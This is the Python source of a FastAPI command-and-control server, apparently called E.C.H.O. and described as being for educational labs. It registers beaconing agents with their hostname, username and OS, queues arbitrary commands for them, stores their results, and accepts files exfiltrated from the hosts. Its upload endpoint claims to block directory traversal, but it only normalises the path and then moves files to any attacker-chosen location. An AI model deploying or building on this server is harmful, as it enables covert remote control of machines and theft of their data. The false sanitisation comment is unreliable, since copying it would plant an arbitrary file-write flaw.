# server/server.py
# E.C.H.O: Endpoint Command & Host Operations (educational labs)
# Usage:
# uvicorn server:app --host 0.0.0.0 --port 8443 --ssl-keyfile=certs/server.key --ssl-certfile=certs/server.crt

import os
from fastapi import FastAPI, Request, UploadFile, File, HTTPException, Header, Depends
from pydantic import BaseModel
from typing import Dict, List, Optional
from datetime import datetime, timezone
import uuid
import json
import secrets
import stat
import sys
from fastapi.responses import JSONResponse
import shutil
import aiofiles

app = FastAPI(title="E.C.H.O: Endpoint Command & Host Operations (educational)")

# In-memory store (for lab). Persistent storage can be added later.
AGENTS: Dict[str, dict] = {}
COMMAND_QUEUES: Dict[str, List[dict]] = {}
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

ECHO_AUTH_TOKEN = os.environ.get("ECHO_AUTH_TOKEN")
if not ECHO_AUTH_TOKEN:
    print("ECHO_AUTH_TOKEN not found in environment variables.")
    sys.exit(1)
    

class BeaconIn(BaseModel):
    agent_id: Optional[str] = None
    hostname: Optional[str] = None
    username: Optional[str] = None
    os: Optional[str] = None
    extra: Optional[dict] = None  # free-form telemetry

class CmdOut(BaseModel):
    cmd_id: str
    command: str

class ResultIn(BaseModel):
    agent_id: str
    command: Optional[str] = None
    cmd_id: Optional[str] = None
    result: dict


def check_token(x_auth_token: Optional[str] = Header(None)):
    if ECHO_AUTH_TOKEN:
        if not x_auth_token:
            raise HTTPException(status_code=401, detail="Missing X-Auth-Token")
        if x_auth_token != ECHO_AUTH_TOKEN:
            raise HTTPException(status_code=403, detail="Invalid X-Auth-Token")
    return True

def register_or_update_agent(payload: BeaconIn):
    if not payload.agent_id:
        agent_id = str(uuid.uuid4())
        AGENTS[agent_id] = {
            "id": agent_id,
            "first_seen": datetime.now(timezone.utc).isoformat(),
            "hostname": payload.hostname,
            "username": payload.username,
            "os": payload.os,
            "last_seen": datetime.now(timezone.utc).isoformat(),
            "extra": payload.extra or {}
        }
        COMMAND_QUEUES[agent_id] = []
    else:
        agent_id = payload.agent_id
        if agent_id not in AGENTS:
            AGENTS[agent_id] = {
                "id": agent_id,
                "first_seen": datetime.now(timezone.utc).isoformat(),
                "hostname": payload.hostname,
                "username": payload.username,
                "os": payload.os,
                "last_seen": datetime.now(timezone.utc).isoformat(),
                "extra": payload.extra or {}
            }
            COMMAND_QUEUES[agent_id] = []
        else:
            AGENTS[agent_id]["last_seen"] = datetime.now(timezone.utc).isoformat()
            for k in ("hostname", "username", "os", "extra"):
                v = getattr(payload, k)
                if v:
                    AGENTS[agent_id][k] = v
    return payload.agent_id if payload.agent_id else agent_id

@app.post("/beacon")
async def beacon(payload: BeaconIn, x_auth_token: Optional[str] = Header(None)):
    """Receive beacon from agent, register/update it, and return next command if any."""
    check_token(x_auth_token)
    agent_id = register_or_update_agent(payload)
    queue = COMMAND_QUEUES.get(agent_id, [])
    if queue:
        task = queue.pop(0)
        return {"task": task}
    else:
        return {"task": None, "agent_id": agent_id}

@app.post("/send_command/{agent_id}")
async def send_command(agent_id: str, request: Request, auth_ok: bool = Depends(check_token)):
    """Send a command to a specific agent by adding it to its command queue."""
    data = await request.json()
    cmd = data.get("command")
    if not cmd:
        raise HTTPException(status_code=400, detail="Missing 'command' in JSON body")
    cmd_id = str(uuid.uuid4())
    task = {"cmd_id": cmd_id, "command": cmd, "timestamp": datetime.now(timezone.utc).isoformat()}
    if agent_id not in COMMAND_QUEUES:
        COMMAND_QUEUES[agent_id] = []
    COMMAND_QUEUES[agent_id].append(task)
    return {"status": "ok", "cmd_id": cmd_id}

@app.post("/results")
async def results(payload: ResultIn, auth_ok: bool = Depends(check_token)):
    """Receive command execution results from agents and save to uploads/ directory."""
    agent_id = payload.agent_id
    ts = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")
    safe_name = f"{agent_id}_{ts}_result.json"
    path = os.path.join(UPLOAD_DIR, safe_name)
    async with aiofiles.open(path, "w", encoding="utf-8") as f:
        await f.write(json.dumps({
            "received_ts": datetime.now(timezone.utc).isoformat(),
            "agent_id": agent_id,
            "command": payload.command,
            "cmd_id": payload.cmd_id,
            "result": payload.result
        }, ensure_ascii=False, indent=2))
    return {"status": "saved", "path": path}

@app.get("/agents")
async def list_agents(auth_ok: bool = Depends(check_token)):
    return {"agents": list(AGENTS.values())}

@app.get("/results_list")
async def results_list(auth_ok: bool = Depends(check_token)):
    """List all result JSON files in uploads/ directory."""
    files = []
    for fname in sorted(os.listdir(UPLOAD_DIR), reverse=True):
        if fname.endswith("_result.json"):
            path = os.path.join(UPLOAD_DIR, fname)
            try:
                async with aiofiles.open(path, "r", encoding="utf-8") as f:
                    content = await f.read()
                    j = json.loads(content)
                files.append({
                    "filename": fname,
                    "path": path,
                    "command": j.get("command"),
                    "received_ts": j.get("received_ts"),
                    "agent_id": j.get("agent_id"),
                    "result": j.get("result", {})
                })
            except Exception:
                continue
    return {"results": files}

@app.post("/download/{agent_id}")
async def download_file(agent_id: str, file: UploadFile = File(...), auth_ok: bool = Depends(check_token)):
    """Download a file using an agent and store it in uploads/"""
    try:
        ts = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")
        safe_name = f"{agent_id}_{ts}_{file.filename}"
        path = os.path.join(UPLOAD_DIR, safe_name)

        async with aiofiles.open(path, "wb") as f:
            await f.write(await file.read())

        meta = {
            "filename": file.filename,
            "saved_as": safe_name,
            "received_ts": datetime.now(timezone.utc).isoformat(),
            "agent_id": agent_id
        }
        return JSONResponse({"status": "uploaded", "meta": meta})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Upload failed: {str(e)}")



@app.post("/upload/{agent_id}")
async def upload_file(agent_id: str,request: Request,file: UploadFile = File(...),auth_ok: bool = Depends(check_token)):
    """Upload a local file from agent to C2 (DOWNLOAD from operator POV)."""
    try:
        ts = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")
        safe_name = f"{agent_id}_{ts}_{file.filename}"
        path = os.path.join(UPLOAD_DIR, safe_name)

        # Save the uploaded file
        async with aiofiles.open(path, "wb") as f:
            await f.write(await file.read())

        # optional relocation based on header X-Dest-Path 
        dest_path = None
        moved = False
        if "X-Dest-Path" in request.headers:
            dest_path = request.headers["X-Dest-Path"]
            
            # Sanitize dest_path to prevent directory traversal
            dest_path = os.path.normpath(dest_path)
            dest_dir = os.path.dirname(dest_path)
            try:
                os.makedirs(dest_dir, exist_ok=True)
                shutil.move(path, dest_path) 
                path = dest_path
                moved = True
            except Exception as e:
                print(f"[!] Failed to move to {dest_path}: {e}")

        meta = {
            "filename": file.filename,
            "saved_as": path,
            "moved": moved,
            "received_ts": datetime.now(timezone.utc).isoformat(),
            "agent_id": agent_id
        }
        return JSONResponse({"status": "uploaded", "meta": meta})

    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Upload failed: {str(e)}")
